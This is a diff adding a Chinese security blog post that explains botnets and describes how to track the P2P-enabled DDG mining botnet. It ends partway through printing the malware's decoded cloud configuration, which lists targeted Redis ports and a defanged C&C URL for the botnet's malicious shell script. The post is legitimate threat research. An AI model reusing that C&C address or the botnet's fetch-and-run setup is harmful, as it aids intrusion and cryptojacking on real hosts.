@@ -1,0 +1,1025 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="qBZOdQGNufiwjuoePxh48OOtXbE2OcD2yxZE6tLxrsM" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="http://apps.bdimg.com/libs/webfont/1.3.0/webfont_debug.js/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="security,p2p,botnet,ddg," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="JiaYu's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序 文章分为三部分：
+
+Botnet 简介
+DDG.Mining.Botne">
+<meta property="og:type" content="article">
+<meta property="og:title" content="以 P2P 的方式追踪 DDG 僵尸网络">
+<meta property="og:url" content="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/index.html">
+<meta property="og:site_name" content="JiaYu's Blog">
+<meta property="og:description" content="本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序 文章分为三部分：
+
+Botnet 简介
+DDG.Mining.Botne">
+<meta property="og:image" content="http://jiayu0x.com/imgs/ddos_botnet.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/traditional_botnet_structure.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/p2p_botnet_structure.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/nodes.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/ddg_botnet_structure.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/gossip_failed_msg.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/gossip_failed_msg_patched.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/latest_20_peers.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/count_distinct_ip.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/latest_alive_bots.png">
+<meta property="og:image" content="http://jiayu0x.com/imgs/botnet_tracker_slack_msg.png">
+<meta property="og:updated_time" content="2019-05-11T06:35:23.036Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="以 P2P 的方式追踪 DDG 僵尸网络">
+<meta name="twitter:description" content="本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序 文章分为三部分：
+
+Botnet 简介
+DDG.Mining.Botne">
+<meta name="twitter:image" content="http://jiayu0x.com/imgs/ddos_botnet.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","d#isplay":"post","display":"hide","offset":12,"offset_float":0,"b2t":true,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/"/>
+
+
+
+
+
+  <title> 以 P2P 的方式追踪 DDG 僵尸网络 | JiaYu's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-96776353-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?48422440cafd0d34da02c8973715c008";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">JiaYu's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">浪人</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xjiayu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JiaYu's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                以 P2P 的方式追踪 DDG 僵尸网络
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-11T00:00:00+08:00">
+                2019-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/11/track-ddg-botnet-by-p2p-protocol/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/04/11/track-ddg-botnet-by-p2p-protocol/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序<br> <strong>文章分为三部分</strong>：</p>
+<ol>
+<li>Botnet 简介</li>
+<li>DDG.Mining.Botnet 介绍，着重介绍其涉及的 P2P 特性；</li>
+<li>根据 DDG.Mining.Botnet 的 P2P 特性，设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，来遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时获知 Botnet 中最新启用的 C&amp;C 服务器。</li>
+</ol>
+</blockquote>
+<p>文章首发于安全客，原文链接：</p>
+<ol>
+<li><a href="https://www.anquanke.com/post/id/177665" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（上）</a></li>
+<li><a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（下）</a></li>
+</ol>
+<a id="more"></a>
+<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><h3 id="1-1-Botnet-及其网络结构"><a href="#1-1-Botnet-及其网络结构" class="headerlink" title="1.1 Botnet 及其网络结构"></a>1.1 Botnet 及其网络结构</h3><h4 id="1-1-1-Botnet-简介"><a href="#1-1-1-Botnet-简介" class="headerlink" title="1.1.1 Botnet 简介"></a>1.1.1 Botnet 简介</h4><p><strong>Botnet(僵尸网络)</strong>没有一个准确的定义，关于什么是 Botnet，众说纷纭，总结起来不外乎两大特性：</p>
+<ol>
+<li>众多被入侵的僵尸主机，上面运行着相同的 Botnet 客户端恶意程序，这些众多的僵尸主机组成一个大型的“网络”(顾名思义被称作<strong>僵尸网络</strong>)，可以进行统一的恶意活动——<strong>主要特性</strong>；</li>
+<li>僵尸网络实施的统一的恶意活动，由 C&amp;C(Command and Control)服务来控制，一般说来，是可以长时间持续控制——<strong>次要特性</strong>。</li>
+</ol>
+<p>Botnet 常见的恶意活动有实施 DDoS 攻击、用来做 Proxy Server 或者发送垃圾邮件等等。一个典型 DDoS Botnet 的大致结构如下图所示：</p>
+<p><img src="/imgs/ddos_botnet.png" style="zoom:40%"></p>
+<h4 id="1-1-2-传统-Botnet"><a href="#1-1-2-传统-Botnet" class="headerlink" title="1.1.2 传统 Botnet"></a>1.1.2 传统 Botnet</h4><p>传统的 Botnet，一般指<strong>可以通过少数特定C&amp;C服务器来集中式控制的僵尸网络</strong>，用来给僵尸主机上的 Botnet 客户端恶意程序下发指令的服务器，叫做 <strong>C&amp;C 服务器</strong>(Command and Control Server)。其网络模型基于 Client-Server 模型，属于<strong>中心化控制(Centralized Control)</strong>方式。其概要结构图如下(中间的图标代表 C&amp;C 服务器)：</p>
+<p><img src="/imgs/traditional_botnet_structure.png" style="zoom:40%"></p>
+<p>这种网络结构只有一个或者少数几个 C&amp;C 服务器，一旦 C&amp;C 服务器被封堵、屏蔽，整个 Botnet 就轰然倒塌，脆弱性是显而易见的。所以，这种网络结构的 Botnet 发展历程中，从样本层面到网络设施层面都衍生了错综复杂的对抗措施，二进制样本层面的对抗之外，从 DGA 到 Fast-Flux，到借助于公共网络服务的 C&amp;C 通道，再到近两年基于区块链的域名解析，最终目的都是提高这种 Botnet 背后 C&amp;C 服务的健壮性，以降低被轻易摧毁的可能性。</p>
+<h4 id="1-1-3-P2P-Botnet"><a href="#1-1-3-P2P-Botnet" class="headerlink" title="1.1.3 P2P Botnet"></a>1.1.3 P2P Botnet</h4><p>为了避免传统 Botnet 中的 <strong>单点故障</strong> 现象，也不想使用太复杂的技术来提高个别 C&amp;C 服务的健壮性，去中心化的 P2P Botnet 应运而生。基于 P2P 协议实现的 Botnet，不再需要中心化的 C&amp;C 服务器，只靠 Bot 节点之间各自通信，传播指令或者恶意文件。而 Botnet 的控制者(BotMaster)就隐藏在大批量的 Bot 节点中，悄悄控制着整个 Botnet。</p>
+<p>这样以来至少有两个显而易见的好处：一方面消除了传统 Botnet 中的中心化控制带来的单点故障因素，另一方面还让 BotMaster 更加隐蔽。</p>
+<p>关于 P2P Botnet，有 3 个方面要阐述清楚，才能更好地理解这种 Botnet。</p>
+<p><strong>一</strong>是所使用的 <strong>P2P 协议</strong>。P2P 协议有很多种，并且不止一种 P2P 协议可以用来组建 P2P Botnet。目前最常见的 P2P 协议莫过于基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 实现的 P2P 协议，用来构建 P2P 文件共享网络的 BitTorrent 协议，也是基于 DHT 协议实现。</p>
+<p><strong>二</strong>是 Botnet 的<strong>控制方式</strong>。前面说过 P2P Botnet 中，BotMaster 控制着其中一个 Bot 节点（后文简称 <strong>SBot</strong> ），隐藏在大批量的 Bot 节点中，通过 SBot 节点，向整个 Botnet 发出控制指令或者更新恶意文件。根据 P2P 协议特性，理论上任何人都可以加入这个网络并与其他节点通信。整个过程中，BotMaster 必须保证只有他自己可以发送有效的控制指令或文件，其他节点可以进行常规通信(遍历节点、查询临近节点信息、接收指令或文件等等)，但不能发送控制指令或文件。其他节点发出的指令或文件，整个网络中的 Bot 节点都不会接受。</p>
+<p>要实现这样的特性，BotMaster 必须给这些关键通信加上校验机制。比如利用非对称加密算法，通过只有 BotMaster 一人掌握的密钥给通信内容加上数字签名。接收到指令或文件的 Bot 节点，会用自己的另一个密钥来校验数据的合法性，合法的通信才接受，非法的则丢弃。</p>
+<p><strong>三</strong>是 P2P Botnet 的<strong>网络结构</strong>。P2P Botnet 的结构，就是典型的 P2P 网络结构，如图所示：</p>
+<p><img src="/imgs/p2p_botnet_structure.png" style="zoom:50%"></p>
+<p>这其实是一个简化的网络模型，考虑到 NAT 的存在，这种模型图并不能精准描述 P2P Botnet 的网络结构。对此， <a href="https://twitter.com/MalwareTechBlog" target="_blank" rel="external">@MalwareTechBlog</a> 在 <a href="https://www.malwaretech.com/2013/12/peer-to-peer-botnets-for-beginners.html" target="_blank" rel="external">Peer-to-Peer Botnets for Beginners</a> 中有详细描述，他给出的 P2P Botnet 网络结构图如下：</p>
+<p><img src="/imgs/nodes.png" alt=""></p>
+<h4 id="1-1-4-挖矿僵尸网络"><a href="#1-1-4-挖矿僵尸网络" class="headerlink" title="1.1.4 挖矿僵尸网络"></a>1.1.4 挖矿僵尸网络</h4><p>文章开头说了 Botnet 的两大特性，第二条算是<strong>次要特性</strong>，这样说的理由，配合挖矿僵尸网络(Mining Botnet)来解释更容易理解。</p>
+<p>一般说来，无论是传统 Botnet  还是 P2P Botnet，都有一个 C&amp;C 服务来持续控制它，比如控制它今天 DDoS 一个网站，明天给某个帖子刷量，后天又去发一波垃圾邮件……但近些年来，随着挖矿僵尸网络的盛行，由于盈利模式的简单粗暴，致使 Botnet 的网络结构也发生了细微的变化：<strong>挖矿僵尸网络可以不再需要一个持续控制的 C&amp;C 服务</strong>。</p>
+<p>对于<strong>纯粹的</strong>挖矿僵尸网络，它的恶意活动是单一而且确定的：<strong>挖矿</strong>，所以可以不再需要一个 C&amp;C 服务来给它下发指令来实施恶意活动；它的恶意活动是持续进行的，不间断也不用切换任务，所以也不需要一个 C&amp;C 服务来<strong>持续控制</strong>。挖矿僵尸网络要做的事情，从在受害主机上植入恶意矿机程序开始，就可以放任不管了。甚至 BotMaster 都不需要做一个 Report 服务来统计都有哪些僵尸节点来给自己挖矿，自己只需要不断地<strong>入侵主机–&gt;植入矿机–&gt;启动矿机程序挖矿</strong>，然后坐等收益即可。</p>
+<p>这只是比较简单粗暴的情况，即使没有一个持续控制的 C&amp;C 服务，我们也把它叫做 Botnet——Mining.Botnet。不过为了谨慎起见，窃以为还要加上一个特性：恶意程序的<strong>蠕虫特性</strong>。如果一个攻击者，它的相关恶意程序没有蠕虫特性，只是自己通过批量扫描+漏洞利用批量拿肉鸡，然后往肉鸡上批量植入恶意矿机程序来盈利，我们并不认为它植入的这些矿机程序组成了一个 Botnet。一旦有了蠕虫特性，恶意程序会自己主动传播，一步步构建成一个统一的<strong>网络</strong>，然后统一挖矿来为黑客牟利，我们才会把它叫做 Mining.Botnet(之所以有这个认识，可能是因为目前曝光的绝大多数稍具规模或者危害稍大的挖矿僵尸网络，其中恶意样本或多或少都有蠕虫特性)。</p>
+<p>这样，纯粹的 Mining.Botnet 可以只满足文章开头提到的第一个特性，只要自身恶意程序有蠕虫特性，我们还是可以把它称为 Botnet。</p>
+<p>当然，这只是为了说明 Botnet 网络架构微小变化而举的简单粗暴的例子。现实中遇到的 Mining.Botnet ，大多要更复杂一些。一般至少会有一个服务器提供恶意样本的下载，有的会提供一个云端的配置文件来控制矿机工作，有的会自建矿池代理服务，有的会在入侵、传播阶段设置更加复杂的服务端控制，还有的在持久驻留失陷主机方面做复杂的对抗……需要注意的是，这些真实存在的 Mining.Botnet 中，这些恶意服务器提供的多是下载、代理服务，而不一定具有传统 Botnet C&amp;C 服务那样<strong>下发控制指令</strong>的功能。</p>
+<h3 id="1-2-对-Botnet-的处置措施"><a href="#1-2-对-Botnet-的处置措施" class="headerlink" title="1.2 对 Botnet 的处置措施"></a>1.2 对 Botnet 的处置措施</h3><p>对于 Botnet，安全研究人员 OR 安全厂商可以采取的措施，大致有以下几种：</p>
+<ol>
+<li>分析透彻 Botnet 样本工作原理、攻击链条、控制方式、通信协议以及网络基础设施，评估该 Botnet 可能造成的危害；梳理中招后的清除方案，提取相关 IoC 并公开给安全社区。安全厂商在安全产品中实现基于样本特征、通信协议或者 IoC 的防御措施，保护用户的安全。这样可以削弱整个 Botnet；</li>
+<li>联合 ISP 和执法机构，封堵 Botnet 背后的网络基础设施，对域名采取 Sinkhole 措施或者直接禁止解析，阻断 IP 访问甚至控制 C&amp;C 服务器的主机。如果 Botnet 的网络基础设施比较脆弱，比如只有这么一个 C&amp;C 服务器，这样会直接端掉(Take Down)整个 Botnet；</li>
+<li>根据对 Botnet 的协议特征、攻击方式等方面的分析，或者根据对其 C&amp;C 域名的 Sinkhole 数据，度量 Botnet 的规模，统计 Bot 节点的信息，联合有关方面清除 Bot 节点上的 Bot 程序。这样也会削弱整个 Botnet；</li>
+<li>通过对 Botnet 的跟踪（监控云端配置文件、解析 C&amp;C 服务器的最新指令或者 P2P 追踪等等），监控 Botnet 的最新动向，方便采取一定防御措施；</li>
+<li>对于有缺陷的 P2P Botnet，通过向 Botnet 投毒的方式清除整个 Botnet。</li>
+</ol>
+<p>简单总结起来，就是<strong>能干掉的就干掉，干不掉的就想办法将它削弱</strong>。</p>
+<h2 id="2-DDG-Mining-Botnet"><a href="#2-DDG-Mining-Botnet" class="headerlink" title="2. DDG.Mining.Botnet"></a>2. DDG.Mining.Botnet</h2><p>DDG.Mining.Botnet(下文称 <strong>ddg</strong>) 是一个挖矿僵尸网络。ddg 最初的结构比较简单：</p>
+<ul>
+<li><strong>具有蠕虫功能的恶意程序</strong>(下文简称 <strong>主样本</strong>)可以利用漏洞来入侵主机实现自主传播；</li>
+<li>有 1~3 个<strong>文件下载服务器</strong>提供矿机程序和恶意 Shell 脚本的下载，Shell 脚本被具有蠕虫功能的恶意程序下载到失陷主机中用来做定时任务，实现常驻失陷主机；恶意矿机程序则被 Shell 脚本不断下载、启动来挖矿。</li>
+</ul>
+<p>360Netlab 对 ddg 进行了长期跟踪，对它的几个主要版本进行详细分析并发布 <a href="https://blog.netlab.360.com/tag/ddg/" target="_blank" rel="external">系列技术报告</a>。现在，ddg 已经集成了 P2P 机制，实现了 Bot 节点间的互联互通，构建成了一个<strong>非典型</strong> P2P Botnet(下文会解释为什么称它<strong>非典型</strong>)。</p>
+<p>不过我们没能把  ddg 干掉，只做到了<strong>追踪</strong>(因为它内部有基于 RSA 数字签名的校验机制，无法向僵尸网络投毒；也没能 Take Down 它的 C&amp;C Server)，这也是本文的主题。目前我们可以做到以下四点：</p>
+<ul>
+<li>及时获取当前 ddg 中的 Bot 节点信息；</li>
+<li>及时获取它最新的云端配置数据；</li>
+<li>即使获取它释放出来的最新恶意样本；</li>
+<li>及时获知它最新启用的 C&amp;C Server。</li>
+</ul>
+<p>接下来就从 ddg 的核心特性说起，参考这些核心特性一步一步设计一个 P2P Botnet Tracker。</p>
+<h3 id="2-1-ddg-的网络结构"><a href="#2-1-ddg-的网络结构" class="headerlink" title="2.1 ddg 的网络结构"></a>2.1 ddg 的网络结构</h3><p>相比最初的结构，ddg 当前版本有两个新特性：</p>
+<ul>
+<li>1~3 个文件下载服务器同时提供云端配置数据，ddg 的主样本会通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据；</li>
+<li>僵尸网络内启用了P2P通信机制：集成了分布式节点控制框架 <a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">Memberlist</a>，该框架实现了扩展版的<strong>弱一致性分布式控制协议 <a href="http://www.cs.cornell.edu/projects/Quicksilver/public_pdfs/SWIM.pdf" target="_blank" rel="external">SWIM</a></strong> (扩展版的协议称为 <strong><a href="https://arxiv.org/pdf/1707.00788.pdf]" target="_blank" rel="external">Lifeguard</a></strong> )，并以此实现了 P2P 机制，用来管理自己的 Peers(Bots)。</li>
+</ul>
+<p>综合一下，当前集成了 P2P 机制的 ddg，网络结构概要图大致如下：</p>
+<p><img src="/imgs/ddg_botnet_structure.png" style="zoom:50%"></p>
+<p>上图黄色虚线聚焦的图标，代表 ddg 的恶意服务器，提供主样本程序、恶意 Shell 脚本和矿机程序的下载，还提供云端配置数据的下发服务。这里就可以解释前文中说 ddg 当前版本是<strong>非典型</strong> P2P Botnet 的理由了：</p>
+<ul>
+<li><strong>网络结构</strong>：典型的 P2P Botnet 网络结构，至少不会有中间一个<strong>中心化</strong>的文件和配置数据服务器，加上这么一个中心化的恶意服务器，显得 P2P 的网络结构不是那么“纯粹”。一个比较纯粹的 P2P Botnet ，网络结构可以参考名噪一时的 P2P Botnet <strong><a href="https://blog.netlab.360.com/hajime-status-report/" target="_blank" rel="external">Hajime</a></strong>，去除中间那个中心化的恶意服务器，所有指令、文件和配置数据的下发与传播，都靠 P2P 协议来实现，在 Bot 节点之间互相传递。而 ddg 这种网络结构，也使得它构建的 P2P 网络承载的功能比较鸡肋：只用来做 Bot 节点间的常规通信，不能承载 Botnet 的关键恶意活动；</li>
+<li><strong>网络协议</strong>：构建 P2P 网络，无论是常见的 BT 文件共享网络还是恶意的 Botnet，比较多的还是基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 协议来实现。Hajime 和同样是 Go 语言编写的 P2P Botnet <strong><a href="https://vms.drweb.com/virus/?_is=1&amp;i=8436299" target="_blank" rel="external">Rex</a></strong> ，用来构建 P2P 网络的协议都是 DHT。而 ddg 构建 P2P 网络的框架则是本来在分布式系统领域用来做集群成员控制的 Memberlist 框架，该框架用基于 Gossip 的弱一致性分布式控制协议来实现。如果不太明白这个框架常规的应用场景，那么把它跟 <a href="https://en.wikipedia.org/wiki/Apache_ZooKeeper" target="_blank" rel="external">Apache ZooKeeper</a> 来对比一下或许更容易理解：它们都可用于分布式节点的服务发现，只不过 ZooKeeper 是强一致性的，而 Memberlist 是弱一致性(参考： <a href="https://www.jianshu.com/p/5e7e78788d12" target="_blank" rel="external">基于流言协议的服务发现存储仓库设计</a>)。</li>
+</ul>
+<p>基于以上两点，足够说明 ddg 是一个 <strong>非典型</strong> P2P Botnet。</p>
+<h3 id="2-2-ddg-的-C-amp-C-服务器"><a href="#2-2-ddg-的-C-amp-C-服务器" class="headerlink" title="2.2 ddg 的 C&amp;C 服务器"></a>2.2 ddg 的 C&amp;C 服务器</h3><p>ddg 的服务器自从提供了云端配置数据的下发，便具备了传统僵尸网络中的 Command and Control 功能，所以可以名正言顺地称之为 C&amp;C 服务器。</p>
+<p>ddg 的服务器地址，在是内置在主样本中的。在主样本中有一个 <strong>HUB IP List</strong> 的结构，里面有上百个 IP 地址的列表，这份列表中，绝大部分是失陷主机的 WAN_IP 地址，只有1~3 个是当前存活的 C&amp;C 地址(1 个 <strong>主 C&amp;C 服务器</strong>，2 个<strong>备用 C&amp;C 服务器</strong>)。主样本执行期间会遍历这份 IP 列表，找到可用的 C&amp;C 服务器地址，通过向 <code>http://&lt;c&amp;c_server&gt;/slave</code> 发送 Post 请求来获取配置数据。</p>
+<p>云端配置数据是用 <a href="https://msgpack.org" target="_blank" rel="external">msgPack</a> 编码过的，解码后的配置数据中有最新的恶意 Shell 脚本下载地址，这个下载地址中的 IP 即为最新的 <strong>主 C&amp;C 服务器</strong>。</p>
+<p>恶意的 Shell 脚本中会给出最新的主样本下载地址，这个下载地址中的 IP 也是最新的<strong>主 C&amp;C 服务器</strong>，目前来看，恶意 Shell 脚本中的 C&amp;C 地址与云端配置数据中提供的 C&amp;C 地址都是一致的。</p>
+<p>这样一来，共有 3 中方式能获取到最新的 C&amp;C 服务器地址：</p>
+<ol>
+<li>解析 HUB IP List，通过遍历其中的 IP 列表来发现 C&amp;C 服务器地址；</li>
+<li>解析恶意 Shell 脚本，提取其中的 C&amp;C服务器地址；</li>
+<li>解析配置文件，提取其中的 C&amp;C 服务器地址。</li>
+</ol>
+<h3 id="2-3-ddg-的云端配置数据"><a href="#2-3-ddg-的云端配置数据" class="headerlink" title="2.3 ddg 的云端配置数据"></a>2.3 ddg 的云端配置数据</h3><p>前文提到过，ddg 的云端配置数据，是经过 msgPack 编码的，配置数据解码后的内容如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    'Data':&#123;</div><div class="line">        'CfgVer': 6,</div><div class="line">        'Cmd': &#123;</div><div class="line">            'AAredis': &#123;</div><div class="line">                'Duration': '240h',</div><div class="line">                'GenAAA': False,</div><div class="line">                'GenLan': True,</div><div class="line">                'IPDuration': '6h',</div><div class="line">                'Id': 6062,</div><div class="line">                'Ports': [6379, 6389, 7379],</div><div class="line">                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',</div><div class="line">                'Timeout': 